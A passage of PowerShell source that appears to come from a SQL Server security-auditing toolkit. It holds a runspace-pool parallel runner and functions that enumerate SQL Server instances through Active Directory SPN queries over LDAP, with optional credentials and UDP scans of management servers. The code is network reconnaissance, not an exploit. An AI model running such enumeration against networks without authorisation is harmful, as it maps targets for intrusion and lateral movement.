                    $runMin = [math]::Round( $runtime.totalminutes ,2 )

                    #set up log object
                    $log = '' | Select-Object -Property Date, Action, Runtime, Status, Details
                    $log.Action = "Removing:'$($runspace.object)'"
                    $log.Date = $currentdate
                    $log.Runtime = "$runMin minutes"

                    #If runspace completed, end invoke, dispose, recycle, counter++
                    If ($runspace.Runspace.isCompleted)
                    {
                        $script:completedCount++

                        #check if there were errors
                        if($runspace.powershell.Streams.Error.Count -gt 0)
                        {
                            #set the logging info and move the file to completed
                            $log.status = 'CompletedWithErrors'
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            foreach($ErrorRecord in $runspace.powershell.Streams.Error)
                            {
                                Write-Error -ErrorRecord $ErrorRecord
                            }
                        }
                        else
                        {
                            #add logging details and cleanup
                            $log.status = 'Completed'
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                        }

                        #everything is logged, clean up the runspace
                        $runspace.powershell.EndInvoke($runspace.Runspace)
                        $runspace.powershell.dispose()
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                    }

                    #If runtime exceeds max, dispose the runspace
                    ElseIf ( $RunspaceTimeout -ne 0 -and $runtime.totalseconds -gt $RunspaceTimeout)
                    {
                        $script:completedCount++
                        $timedOutTasks = $true

                        #add logging details and cleanup
                        $log.status = 'TimedOut'
                        #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                        Write-Error -Message "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | Out-String)"

                        #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                        if (!$NoCloseOnTimeout)
                        {
                            $runspace.powershell.dispose()
                        }
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                        $completedCount++
                    }

                    #If runspace isn't null set more to true
                    ElseIf ($runspace.Runspace -ne $null )
                    {
                        $log = $null
                        $more = $true
                    }

                    #log the results if a log file was indicated
                    <#
                            if($logFile -and $log){
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                            }
                    #>
                }

                #Clean out unused runspace jobs
                $temphash = $runspaces.clone()
                $temphash |
                Where-Object -FilterScript {
                    $_.runspace -eq $null
                } |
                ForEach-Object -Process {
                    $runspaces.remove($_)
                }

                #sleep for a bit if we will loop again
                if($PSBoundParameters['Wait'])
                {
                    Start-Sleep -Milliseconds $SleepTimer
                }

                #Loop again only if -wait parameter and there are more runspaces to process
            }
            while ($more -and $PSBoundParameters['Wait'])

            #End of runspace function
        }

        #endregion functions

        #region Init

        if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
        {
            $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | Out-String) )
        }
        elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock')
        {
            #Start building parameter names for the param block
            [string[]]$ParamsToAdd = '$_'
            if( $PSBoundParameters.ContainsKey('Parameter') )
            {
                $ParamsToAdd += '$Parameter'
            }

            $UsingVariableData = $null


            # This code enables $Using support through the AST.
            # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!

            if($PSVersionTable.PSVersion.Major -gt 2)
            {
                #Extract using references
                $UsingVariables = $ScriptBlock.ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },$true)

                If ($UsingVariables)
                {
                    $List = New-Object -TypeName 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                    ForEach ($Ast in $UsingVariables)
                    {
                        [void]$List.Add($Ast.SubExpression)
                    }

                    $UsingVar = $UsingVariables |
                    Group-Object -Property SubExpression |
                    ForEach-Object -Process {
                        $_.Group |
                        Select-Object -First 1
                    }

                    #Extract the name, value, and create replacements for each
                    $UsingVariableData = ForEach ($Var in $UsingVar)
                    {
                        Try
                        {
                            $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                            [pscustomobject]@{
                                Name       = $Var.SubExpression.Extent.Text
                                Value      = $Value.Value
                                NewName    = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                            }
                        }
                        Catch
                        {
                            Write-Error -Message "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                        }
                    }
                    $ParamsToAdd += $UsingVariableData | Select-Object -ExpandProperty NewName -Unique

                    $NewParams = $UsingVariableData.NewName -join ', '
                    $Tuple = [Tuple]::Create($List, $NewParams)
                    $bindingFlags = [Reflection.BindingFlags]'Default,NonPublic,Instance'
                    $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))

                    $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                    $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                    #Write-Verbose $StringScriptBlock
                }
            }

            $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ', '))`r`n" + $ScriptBlock.ToString())
        }
        else
        {
            Throw 'Must provide ScriptBlock or ScriptFile'
            Break
        }

        Write-Debug -Message "`$ScriptBlock: $($ScriptBlock | Out-String)"
        If (-not($SuppressVerbose)){
            Write-Verbose -Message 'Creating runspace pool and session states'
        }


        #If specified, add variables and modules/snapins to session state
        $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        if ($ImportVariables)
        {
            if($UserVariables.count -gt 0)
            {
                foreach($Variable in $UserVariables)
                {
                    $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
        }
        if ($ImportModules)
        {
            if($UserModules.count -gt 0)
            {
                foreach($ModulePath in $UserModules)
                {
                    $sessionstate.ImportPSModule($ModulePath)
                }
            }
            if($UserSnapins.count -gt 0)
            {
                foreach($PSSnapin in $UserSnapins)
                {
                    [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                }
            }
        }

        # --------------------------------------------------
        #region - Import Session Functions
        # --------------------------------------------------
        # Import functions from the current session into the RunspacePool sessionstate

        if($ImportSessionFunctions)
        {
            # Import all session functions into the runspace session state from the current one
            Get-ChildItem -Path Function:\ |
            Where-Object -FilterScript {
                $_.name -notlike '*:*'
            } |
            Select-Object -Property name -ExpandProperty name |
            ForEach-Object -Process {
                # Get the function code
                $Definition = Get-Content -Path "function:\$_" -ErrorAction Stop

                # Create a sessionstate function with the same name and code
                $SessionStateFunction = New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", $Definition

                # Add the function to the session state
                $sessionstate.Commands.Add($SessionStateFunction)
            }
        }
        #endregion

        #Create runspace pool
        $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
        $runspacepool.Open()

        #Write-Verbose "Creating empty collection to hold runspace jobs"
        $Script:runspaces = New-Object -TypeName System.Collections.ArrayList

        #If inputObject is bound get a total count and set bound to true
        $bound = $PSBoundParameters.keys -contains 'InputObject'
        if(-not $bound)
        {
            [System.Collections.ArrayList]$allObjects = @()
        }

        <#
                #Set up log file if specified
                if( $LogFile ){
                New-Item -ItemType file -path $logFile -force | Out-Null
                ("" | Select Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
                }

                #write initial log entry
                $log = "" | Select Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }
        #>
        $timedOutTasks = $false

        #endregion INIT
    }

    Process {

        #add piped objects to all objects or set all objects to bound input object parameter
        if($bound)
        {
            $allObjects = $InputObject
        }
        Else
        {
            [void]$allObjects.add( $InputObject )
        }
    }

    End {

        #Use Try/Finally to catch Ctrl+C and clean up.
        Try
        {
            #counts for progress
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0

            foreach($object in $allObjects)
            {
                #region add scripts to runspace pool

                #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                $powershell = [powershell]::Create()

                if ($VerbosePreference -eq 'Continue')
                {
                    [void]$powershell.AddScript({
                            $VerbosePreference = 'Continue'
                    })
                }

                [void]$powershell.AddScript($ScriptBlock).AddArgument($object)

                if ($Parameter)
                {
                    [void]$powershell.AddArgument($Parameter)
                }

                # $Using support from Boe Prox
                if ($UsingVariableData)
                {
                    Foreach($UsingVariable in $UsingVariableData)
                    {
                        #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                        [void]$powershell.AddArgument($UsingVariable.Value)
                    }
                }

                #Add the runspace into the powershell instance
                $powershell.RunspacePool = $runspacepool

                #Create a temporary collection for each runspace
                $temp = '' | Select-Object -Property PowerShell, StartTime, object, Runspace
                $temp.PowerShell = $powershell
                $temp.StartTime = Get-Date
                $temp.object = $object

                #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                $temp.Runspace = $powershell.BeginInvoke()
                $startedCount++

                #Add the temp tracking info to $runspaces collection
                #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                $null = $runspaces.Add($temp)

                #loop through existing runspaces one time
                Get-RunspaceData

                #If we have more running than max queue (used to control timeout accuracy)
                #Script scope resolves odd PowerShell 2 issue
                $firstRun = $true
                while ($runspaces.count -ge $script:MaxQueue)
                {
                    #give verbose output
                    if($firstRun)
                    {
                        #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                    }
                    $firstRun = $false

                    #run get-runspace data and sleep for a short while
                    Get-RunspaceData
                    Start-Sleep -Milliseconds $SleepTimer
                }

                #endregion add scripts to runspace pool
            }

            #Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
            Get-RunspaceData -wait

            if (-not $Quiet)
            {
                Write-Progress -Activity 'Running Query' -Status 'Starting threads' -Completed
            }
        }
        Finally
        {
            #Close the runspace pool, unless we specified no close on timeout and something timed out
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($NoCloseOnTimeout -eq $false) ) )
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message 'Closing the runspace pool'
                }
                $runspacepool.close()
            }

            #collect garbage
            [gc]::Collect()
        }
    }
}

Function Get-ComputerNameFromInstance
{
    <#
            .SYNOPSIS
            Parses computer name from a provided instance.
            .PARAMETER Instance
            SQL Server instance to parse.
            .EXAMPLE
            PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
            SQLServer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Parse ComputerName from provided instance
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }

    Return $ComputerName
}



Function Get-SQLInstanceDomain
{
    <#
            .SYNOPSIS
            Returns a list of SQL Server instances discovered by querying a domain controller for systems with registered MSSQL service principal names.
            The function will default to the current user's domain and logon server, but an alternative domain controller can be provided.
            UDP scanning of management servers is optional.
            .PARAMETER Username
            Domain user to authenticate with domain\user.
            .PARAMETER Password
            Domain password to authenticate with domain\user.
            .PARAMETER Credential
            Credentials to use when connecting to a Domain Controller.
            .PARAMETER DomainController
            Domain controller for Domain and Site that you want to query against.  Only used when username/password or credential is provided.
            .PARAMETER ComputerName
            Domain computer name to filter for.
            .PARAMETER DomainAccount
            Domain account to filter for.
            .PARAMETER CheckMgmt
            Performs UDP scan of servers with registered MSServerClusterMgmtAPI SPNs to help find additional SQL Server instances.
            .PARAMETER UDPTimeOut
            Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -Verbose
            VERBOSE: Grabbing SQL Server SPNs from domain...
            VERBOSE: Getting domain SPNs...
            VERBOSE: Parsing SQL Server instances from SPNs...
            VERBOSE: 35 instances were found.

            ComputerName     : SQLServer1.domain.com
            Instance         : SQLServer1.domain.com
            DomainAccountSid : 1500000521000123456712921821222049996811922123456
            DomainAccount    : SQLServer1$
            DomainAccountCn  : SQLServer1
            Service          : MSSQLSvc
            Spn              : MSSQLSvc/SQLServer1.domain.com
            LastLogon        : 6/22/2016 9:00 AM
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -Verbose -CheckMgmt
            PS C:\> Get-SQLInstanceDomain -Verbose
            VERBOSE: Grabbing SQL Server SPNs from domain...
            VERBOSE: Getting domain SPNs...
            VERBOSE: Parsing SQL Server instances from SPNs...
            VERBOSE: 35 instances were found.
            VERBOSE: Getting domain SPNs...
            VERBOSE: 10 SPNs found on servers that matched search criteria.
            VERBOSE: Performing a UDP scan of management servers to obtain managed SQL Server instances...
            VERBOSE:  - MServer1.domain.com - UDP Scan Start.
            VERBOSE:  - MServer1.domain.com - UDP Scan Complete.

            ComputerName     : SQLServer1.domain.com
            Instance         : SQLServer1.domain.com
            DomainAccountSid : 1500000521000123456712921821222049996811922123456
            DomainAccount    : SQLServer1$
            DomainAccountCn  : SQLServer1
            Service          : MSSQLSvc
            Spn              : MSSQLSvc/SQLServer1.domain.com
            LastLogon        : 6/22/2016 9:00 AM
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -DomainController 10.10.10.1 -Username domain\user -Password SecretPassword123!
            VERBOSE: Grabbing SQL Server SPNs from domain...
            VERBOSE: Getting domain SPNs...
            VERBOSE: Parsing SQL Server instances from SPNs...
            VERBOSE: 35 instances were found.

            ComputerName     : SQLServer1.domain.com
            Instance         : SQLServer1.domain.com
            DomainAccountSid : 1500000521000123456712921821222049996811922123456
            DomainAccount    : SQLServer1$
            DomainAccountCn  : SQLServer1
            Service          : MSSQLSvc
            Spn              : MSSQLSvc/SQLServer1.domain.com
            LastLogon        : 6/22/2016 9:00 AM
            [TRUNCATED]


    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$CheckMgmt,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Preforms a DNS lookup on the instance.')]
        [switch]$IncludeIP,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 3
    )

    Begin
    {
        # Table for SPN output
        $TblSQLServerSpns = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServerSpns.Columns.Add('ComputerName')
        $null = $TblSQLServerSpns.Columns.Add('Instance')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountSid')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccount')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountCn')
        $null = $TblSQLServerSpns.Columns.Add('Service')
        $null = $TblSQLServerSpns.Columns.Add('Spn')
        $null = $TblSQLServerSpns.Columns.Add('LastLogon')
        $null = $TblSQLServerSpns.Columns.Add('Description')

        if($IncludeIP)
        {
            $null = $TblSQLServerSpns.Columns.Add('IPAddress')
        }
        # Table for UDP scan results of management servers
    }

    Process
    {
        # Get list of SPNs for SQL Servers
        Write-Verbose -Message 'Grabbing SPNs from the domain for SQL Servers (MSSQL*)...'
        $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSSQL*' -SuppressVerbose | Where-Object -FilterScript {
            $_.service -like 'MSSQL*'
        }

        Write-Verbose -Message 'Parsing SQL Server instances from SPNs...'

        # Add column containing sql server instance
        $TblSQLServers |
        ForEach-Object -Process {
            # Parse SQL Server instance
            $Spn = $_.Spn
            $Instance = $Spn.split('/')[1].split(':')[1]

            # Check if the instance is a number and use the relevent delim
            $Value = 0
            if([int32]::TryParse($Instance,[ref]$Value))
            {
                $SpnServerInstance = $Spn -replace ':', ','
            }
            else
            {
                $SpnServerInstance = $Spn -replace ':', '\'
            }

            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/', ''

            $TableRow = @([string]$_.ComputerName,
                [string]$SpnServerInstance,
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
                [string]$_.Description)

            if($IncludeIP)
            {
                try
                {
                    $IPAddress = [Net.DNS]::GetHostAddresses([String]$_.ComputerName).IPAddressToString
                    if($IPAddress -is [Object[]])
                    {
                        $IPAddress = $IPAddress -join ", "
                    }
                }
                catch
                {
                    $IPAddress = "0.0.0.0"
                }
                $TableRow += $IPAddress
            }

            # Add SQL Server spn to table
            $null = $TblSQLServerSpns.Rows.Add($TableRow)
        }

        # Enumerate SQL Server instances from management servers
        if($CheckMgmt)
        {
            Write-Verbose -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'
            $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSServerClusterMgmtAPI' -SuppressVerbose |
            Where-Object -FilterScript {
                $_.ComputerName -like '*.*'
            } |
            Select-Object -Property ComputerName -Unique |
            Sort-Object -Property ComputerName

            Write-Verbose -Message 'Performing a UDP scan of management servers to obtain managed SQL Server instances...'
            $TblMgmtSQLServers = $TblMgmtServers |
            Select-Object -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }

    End
    {
        # Return data
        if($CheckMgmt)
        {
            Write-Verbose -Message 'Parsing SQL Server instances from the UDP scan...'
            $Tbl1 = $TblMgmtSQLServers |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl2 = $TblSQLServerSpns |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl3 = $Tbl1 + $Tbl2

            $InstanceCount = $Tbl3.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $Tbl3
        }
        else
        {
            $InstanceCount = $TblSQLServerSpns.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $TblSQLServerSpns
        }
    }
}


function Get-DomainSpn
{
    <#
            .SYNOPSIS
            Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
            Note: This will use the default logon server by default.
            .PARAMETER Username
            Domain account to authenticate to Active Directory.
            .PARAMETER Password
            Domain password to authenticate to Active Directory.
            .PARAMETER Credential
            Domain credential to authenticate to Active Directory.
            .PARAMETER DomainController
            Domain controller to authenticated to. Requires username/password or credential.
            .PARAMETER ComputerName
            Computer name to filter for.
            .PARAMETER DomainAccount
            Domain account to filter for.
            .PARAMETER SpnService
            SPN service code to filter for.
            .EXAMPLE
            PS C:\temp> Get-DomainSpn -SpnService MSSQL | Select-Object -First 2

            UserSid      : 15000005210002431346712321821222048886811922073100
            User         : SQLServer1$
            UserCn       : SQLServer1
            Service      : MSSQLSvc
            ComputerName : SQLServer1.domain.local
            Spn          : MSSQLSvc/SQLServer1.domain.local:1433
            LastLogon    : 6/24/2016 6:56 AM
            Description  : This is a SQL Server test instance using a local managed service account.

            UserSid      : 15000005210002431346712321821222048886811922073101
            User         : SQLServiceAccount
            UserCn       : SQLServiceAccount
            Service      : MSSQLSvc
            ComputerName : SQLServer2.domain.local
            Spn          : MSSQLSvc/SQLServer2.domain.local:NamedInstance
            LastLogon    : 3/26/2016 3:43 PM
            Description  : This is a SQL Server test instance using a domain service account.
            .EXAMPLE
            PS C:\temp> Get-DomainSpn -DomainController 10.0.0.1  -Username Domain\User -Password Password123!
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$SpnService,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message 'Getting domain SPNs...'
        }

        # Setup table to store results
        $TableDomainSpn = New-Object -TypeName System.Data.DataTable
        $null = $TableDomainSpn.Columns.Add('UserSid')
        $null = $TableDomainSpn.Columns.Add('User')
        $null = $TableDomainSpn.Columns.Add('UserCn')
        $null = $TableDomainSpn.Columns.Add('Service')
        $null = $TableDomainSpn.Columns.Add('ComputerName')
        $null = $TableDomainSpn.Columns.Add('Spn')
        $null = $TableDomainSpn.Columns.Add('LastLogon')
        $null = $TableDomainSpn.Columns.Add('Description')
        $TableDomainSpn.Clear()
    }

    Process
    {

        try
        {
            # Setup LDAP filter
            $SpnFilter = ''

            if($DomainAccount)
            {
                $SpnFilter = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }

            if($ComputerName)
            {
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object -Process {
                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]$SidString = $SidBytes -replace ' ', ''
                #$Spn = $_.properties.serviceprincipalname[0].split(',')

                #foreach ($item in $Spn)
                foreach ($item in $($_.properties.serviceprincipalname))
                {
                    # Parse SPNs
                    $SpnServer = $item.split('/')[1].split(':')[0].split(' ')[0]
                    $SpnService = $item.split('/')[0]

                    # Parse last logon
                    if ($_.properties.lastlogon)
                    {
                        $LastLogon = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        $LastLogon = ''
                    }

                    # Add results to table
                    $null = $TableDomainSpn.Rows.Add(
                        [string]$SidString,
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$SpnService,
                        [string]$SpnServer,
                        [string]$item,
                        $LastLogon,
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$TableDomainSpnCount SPNs found on servers that matched search criteria."
            }
            Return $TableDomainSpn
        }
        else
        {
            Write-Verbose -Message '0 SPNs found.'
        }
    }
}



function Get-DomainObject
{
    <#
            .SYNOPSIS
            Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
            Note: This will use the default logon server by default.
            .PARAMETER Username
            Domain account to authenticate to Active Directory.
            .PARAMETER Password
            Domain password to authenticate to Active Directory.
            .PARAMETER Credential
            Domain credential to authenticate to Active Directory.
            .PARAMETER DomainController
            Domain controller to authenticated to. Requires username/password or credential.
            .PARAMETER LdapFilter
            LDAP filter.
            .PARAMETER LdapPath
            Ldap path.
            .PARAMETER $Limit
            Maximum number of Objects to pull from AD, limit is 1,000.".
            .PARAMETER SearchScope
            Scope of a search as either a base, one-level, or subtree search, default is subtree..
            .EXAMPLE
            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))"
            .EXAMPLE
            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!
            .Note
            This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$LdapFilter = '',

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$LdapPath,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$Limit = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$SearchScope = 'Subtree'
    )
    Begin
    {
        # Create PS Credential object
        if($Username -and $Password)
        {
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)
        }

        # Create Create the connection to LDAP
        if ($DomainController)
        {

            # Verify credentials were provided
            if(-not $Username){
                Write-Output "A username and password must be provided when setting a specific domain controller."
                Break
            }

            # Test credentials and grab domain
            try {
                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password).distinguishedname
            }catch{
                Write-Output "Authentication failed."
            }

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = '/'+$LdapPath+','+$objDomain
                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController$LdapPath", $Credential.UserName, $Credential.GetNetworkCredential().Password
            }
            else
            {
                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }
        else
        {
            $objDomain = ([ADSI]'').distinguishedName

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+','+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }
            else
            {
                $objDomainPath  = [ADSI]''
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }

        # Setup LDAP filter
        $objSearcher.PageSize = $Limit
        $objSearcher.Filter = $LdapFilter
        $objSearcher.SearchScope = 'Subtree'
    }

    Process
    {
        try
        {
            # Return object
            $objSearcher.FindAll() | ForEach-Object -Process {
                $_
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
    }
}




function Get-SQLInstanceScanUDP
{
    <#
            .SYNOPSIS
            Returns a list of SQL Servers resulting from a UDP discovery scan of provided computers.
            .PARAMETER ComputerName
            Computer name or IP address to enumerate SQL Instance from.
            .PARAMETER UDPTimeOut
            Timeout in seconds. Longer timeout = more accurate.
            .EXAMPLE
            PS C:\> Get-SQLInstanceScanUDP -Verbose -ComputerName SQLServer1.domain.com
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Express
            InstanceName : Express
            ServerIP     : 10.10.10.30
            TCPPort      : 51663
